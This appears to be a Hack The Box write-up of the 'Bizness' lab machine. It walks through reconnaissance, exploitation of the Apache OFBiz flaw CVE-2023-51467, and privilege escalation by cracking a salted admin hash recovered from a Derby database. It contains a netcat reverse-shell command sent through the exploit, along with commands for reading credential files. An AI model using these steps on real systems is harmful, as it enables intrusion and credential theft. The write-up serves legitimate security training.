# Bizness
Hello, today we will be taking on Bizness, an easy box from HTB.
- [Recon](https://github.com/0x7ax/Bizness?tab=readme-ov-file#recon)
- [Exploit | Initial foothold](https://github.com/0x7ax/Bizness?tab=readme-ov-file#exploit--initial-foothold)
- [Privesc](https://github.com/0x7ax/Bizness?tab=readme-ov-file#privesc)
- [Conclusion](https://github.com/0x7ax/Bizness?tab=readme-ov-file#conclusion)
# Recon
We start with an nmap scan:

`$ nmap -sC -sV -oN nmap/Bizness 10.10.11.252`

![nmap result](https://github.com/0x7ax/Bizness/assets/91915054/59b24c86-a247-457d-9b49-b92a9241043a)
Found SSH, HTTP, and HTTPS

Since we found a hostname, we can add it to /etc/hosts using the following command:

`$ sudo echo “10.10.11.252 bizness.htb” >> /etc/hosts`

Followed HTTPS, found the following on the homepage:
- Address: A108 Adam Street, NY 535022, USA
- Phone #: +1 5589 55488 55
- Email: info@bizness.htb
  
Doesn't seem to take us anywhere.

Then did a gobuster to see if there are any other directories:

`$ gobuster dir -u https://bizness.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --wildcard -k`

I used the flags “--wildcard” and “-k” to avoid errors. Oddly, the sizes were 0 but if we got a redirection then that means we got a valid directory.

Furthermore, we found a /webtools directory that isn't default on all sites, so we can check it out

Turns out it's an Apache OFBiz portal with the version down on the right (18.12)

![OFBiz portal](https://github.com/0x7ax/Bizness/assets/91915054/07a3e27b-7ae1-488d-ae14-52bd9cd5101e)

A quick Google search tells us that it's vulnerable to CVE-2023-51467, which is an interesting vulnerability that will grant us RCE. Feel free to read about it more [here](https://nvd.nist.gov/vuln/detail/CVE-2023-51467)

# Exploit | Initial foothold

I found an exploit online that will run a command on the vulnerable service, hoping that I can get a reverse shell back 

I used [exploit.py](exploit.py), creds go to the owner. 

*Change to your desired ip and port*

- Set up a listener

`$ nc -lvnp [port]`

- Run the following command

`$ python3 exploit.py --url https://bizness.htb --cmd "nc -c sh [ip] [port]"`

![exploit](https://github.com/0x7ax/Bizness/assets/91915054/b63c4476-d35a-46b2-b7f8-dcf9de4b8caa)

We got a reverse shell! Now we have to stabilize it

`$ python3 -c ‘import pty;pty.spawn("/bin/bash")’`

Ctrl+Z

`$ stty raw -echo`

`$ fg` (click Enter twice here)

`$ export TERM=xterm`

Now, you have a full shell.

![stable](https://github.com/0x7ax/Bizness/assets/91915054/cc9eb29b-ce87-4b0a-ae0f-ad475c522e57)

We have spawn in /opt/ofbiz, which is an interesting directory, but first let's grab user.txt from /home/ofbiz

a quick command tells us that only ofbiz and root have shells so it only makes sense that ofbiz has the user.txt file

`$ cat /etc/passwd | grep bash`

![user.txt](https://github.com/0x7ax/Bizness/assets/91915054/1f0479a0-c4b8-40dc-b0fe-af927b5a9e38)

# Privesc

First, I ran linpeas.sh, which didn't tell me much except for the files in /opt/ofbiz

So I digged deeper and found an interesting file that has a SHA1 hash. 

![AdminUserLoginData.xml](https://github.com/0x7ax/Bizness/assets/91915054/7111be9a-b8c2-45e8-bf11-bf7bf56f4c0b)

We found a SHA1 hash: 47ca69ebb4bdc9ae0adec130880165d2cc05db1a

The problem with that hash is that it needs a salt which doesn't appear in the file

With more recon, we found an Apache Derby database which has the salt for the hash above

![derby database](https://github.com/0x7ax/Bizness/assets/91915054/b3e88449-f7be-442b-a060-25044556f1e5)

We can see that the hash for user admin is $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I

We can crack this using john or hashcat, but a more efficient way would be to use a script that encrypts the contents of rockyou.txt and compare it to the string we have

For that I used the following python script which I found online: [pass.py](pass.py), also credits go to the owner

![pass.py](https://github.com/0x7ax/Bizness/assets/91915054/9883b0a3-0794-4eec-880a-b26041ff0c44)

 We got a hit, *monkeybizness*
 
 Use the following command and enter the password above to get root access
 
 `$ su root` 
 
 ![root](https://github.com/0x7ax/Bizness/assets/91915054/b34f5cf9-b38d-45e1-b00a-dd132ac78d69)
 
# Conclusion
Bizness was an easy HTB box that has a vulnerable OFbiz service which leads to RCE. 

This is for educational purposes only
